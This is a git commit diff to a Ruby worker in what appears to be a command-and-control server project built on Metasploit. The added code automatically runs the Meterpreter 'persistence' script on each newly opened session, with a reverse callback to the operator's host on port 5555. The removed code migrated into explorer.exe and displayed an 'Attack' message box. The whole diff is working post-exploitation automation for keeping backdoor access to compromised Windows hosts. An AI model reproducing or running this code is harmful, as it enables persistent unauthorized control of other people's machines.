02e5424e52551c57233e6b4e4b955ecc1cf93ff4
Hauke Mehrtens <hauke@hauke-m.de>
2010-11-05 18:25:37 +0100

    install meterpreter

--- ccserver/script/worker/msf_session_event.rb
+++ ccserver/script/worker/msf_session_event.rb
@@ -3,67 +3,44 @@ require "#{RAILS_ROOT}/script/worker/loader"
 class MsfSessionEvent
   include ::Msf::SessionEvent
 
-  #
-  # Called when a session is opened.
-  #
   def on_session_open(session)
     puts("on_session_open #{session}")
-    install_msf(session)
+    session_action(session)
   end
 
-  #
-  # Called when a session is closed.
-  #
   def on_session_close(session, reason='')
     puts("on_session_close #{session}")
   end
 
-  #
-  # Called when the user writes data to a session.
-  #
   def on_session_command(session, command)
     puts("on_session_command #{session} #{command}")
   end
 end
 
-def install_msf(session)
+def session_action(session)
   thread = Thread.new do
-    show_message(session)
+    begin      
+      install_meterpreter(session)
+    rescue ::Exception
+      puts("problem in session_action: #{$!} #{$!.backtrace}")
+    end
   end
 end
 
-def show_message(session)
-  begin
-    puts "show_message"
-    counter = 0
-    while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
-    puts "show_message: #{session.ext.dump_alias_tree('client')}"
-      counter += 1
-      if counter == 10
-        return
-      end
-      sleep(1)
+def install_meterpreter(session)
+  counter = 0
+  while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
+    counter += 1
+    if counter == 10
+      return
     end
-    puts "show_message start"
-    host_name = session.sys.config.sysinfo['Computer']
-    processes = session.sys.process.get_processes
-
-#    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
-#    lhost = Rex::Socket.source_address("1.2.3.4");
-#    args = "run persistence -S -i 5 -p 5555 -r #{lhost}"
-#    session.execute_file(script_paths, args)
-
-    pid = nil
-    processes.each { |ent|
-      if ent['name'] == "explorer.exe"
-        pid = ent['pid']
-      end
-    }
-    if not pid == nil
-      session.core.migrate(pid)
-      result = session.railgun.user32.MessageBoxA(0, "This is new. \nYour host name is: " + host_name, "Attack", "MB_OK")
-    end
-  rescue ::Exception
-    puts(" >> show_message exception: #{$!} #{$!.backtrace}")
+    sleep(1)
   end
+  script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
+  rhost = session.exploit_datastore["RHOST"]
+  rhost = (rhost != nil and !rhost.empty?) ? rhost : session.target_host
+  lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
+  args = "-S -i 5 -p 5555 -r #{lhost}"
+  puts "run: #{script_path} #{args}"
+  session.execute_file(script_path, args)
 end
